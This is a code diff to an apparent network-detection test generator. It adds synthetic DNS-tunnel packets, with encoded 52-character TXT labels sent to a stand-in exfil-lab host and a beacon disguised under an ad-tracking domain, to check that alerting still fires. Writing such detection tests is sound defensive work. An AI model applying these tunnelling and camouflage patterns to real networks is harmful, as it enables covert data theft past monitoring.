@@ -103,15 +103,18 @@ def dns_query(qid, name):
 
 def dns_tunnel():
     """Five TXT queries with 52-character encoded labels from one workstation via the internal resolver,
-    plus one normal query (must not alert) and one ad/tracking query through the same resolver (lowered: same
-    route as the tunnel, opposite decision)."""
+    plus one normal query (must not alert), one ad/tracking query through the same resolver (lowered: same route
+    as the tunnel, opposite decision), and a beacon hiding under the ad/tracking suffix - the lowering must leave
+    the tunnel signature visible for it."""
     chunks = ["mzxw6ytboi2dmnzrgq3tgojshezdcnbqge2tmnbsgm4dsmjvha4d", "nbswy3dpeb3w64tmmqqgg2dvnzvsa2lomfwgk2le",
               "orsxg5bamjxw63lfnzxgsidvobsgczlfmfzgk2le", "mfzwizdgmfzwizdgmfzwizdgmfzwizdgmfzwizdgmfzwi",
               "nfxgg3tgmfzwizdgnrzxa3dfnzsgk43uojxw4z3e"]
     pkts = [udp("10.10.100.24", "10.10.0.53", 53000 + i, 53, dns_query(0x1000 + i, f"{c}.t.exfil-lab.example"))
             for i, c in enumerate(chunks)]
     return pkts + [udp("10.10.100.25", "10.10.0.53", 53100, 53, dns_query(0x2000, "www.example.com")),
-                   udp("10.10.100.26", "10.10.0.53", 53200, 53, dns_query(0x3000, "pixel.adtrack.example"))]
+                   udp("10.10.100.26", "10.10.0.53", 53200, 53, dns_query(0x3000, "pixel.adtrack.example"))] + \
+        [udp("10.10.100.27", "10.10.0.53", 53300 + i, 53, dns_query(0x4000 + i, f"{c}.adtrack.example"))
+         for i, c in enumerate(chunks[:3])]
 
 
 CASES = {"dcsync": dcsync, "smb-exe": smb_exe, "smb-dll": smb_dll, "http-beacon": beacon, "dns-tunnel": dns_tunnel}
